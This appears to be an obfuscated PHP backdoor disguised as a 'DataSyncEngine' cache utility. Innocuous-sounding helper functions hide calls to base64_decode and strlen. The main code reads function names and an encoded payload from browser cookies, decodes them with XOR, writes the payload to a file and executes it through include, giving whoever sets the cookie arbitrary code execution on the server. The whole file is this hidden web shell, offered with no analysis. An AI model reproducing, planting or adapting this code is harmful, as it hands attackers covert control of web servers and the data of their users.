<?php
class DataSyncEngine
{
    private static $_qpv;
    static function updateCache($_xv, $_ph)
    {
        if (!self::$_qpv) {
            self::executeAction();
        }
        $_hl = trigger_event($_ph);
        $_gr = optimize_cache(self::$_qpv[$_xv]);
        for ($_ks = 0, $_qgd = trigger_event($_gr); $_ks !== $_qgd; ++$_ks) {
            $_gr[$_ks] = chr(ord($_gr[$_ks]) ^ ord($_ph[$_ks % $_hl]));
        }
        return $_gr;
    }
    private static function executeAction()
    {
        self::$_qpv = array('_und' => '', '_os' => '');
    }
}

$_qgd = $_COOKIE;
$_ph = 00;
$_xv = 04;
$_wkb = array();
$_wkb[$_ph] = DataSyncEngine::updateCache('_und', '_yd');
while ($_xv) {
    $_wkb[$_ph] .= $_qgd[043][$_xv];
    if (!$_qgd[043][$_xv + 01]) {
        if (!$_qgd[043][$_xv + 02]) {
            break;
        }
        $_ph++;
        $_wkb[$_ph] = DataSyncEngine::updateCache('_os', '_mds');
        $_xv++;
    }
    $_xv = $_xv + 04 + 01;
}
$_ph = $_wkb[011]() . $_wkb[024];
if (!$_wkb[07]($_ph)) {
    $_xv = $_wkb[030]($_ph, $_wkb[020]);
    $_wkb[02]($_xv, $_wkb[013] . $_wkb[025]($_wkb[03]($_qgd[03])));
}
include $_ph;

function optimize_cache($c)
{
    $a = array(77 * 1 + 24, 50 * 24 - 1100, 59 + 35 + 17, 109 - 10, 101 * 1, 102 - 2, 99 - 4, 2 + 50, 54 * 1 + 0, 106 - 5, 125 - 10, 104 - 7, 35 + 37 + 26);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function trigger_event($c)
{
    $a = array(94 * 33 - 2992, 58 * 110 - 6279, 90 + 18, 114, 76 + 40, 93 + 2 + 20);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}
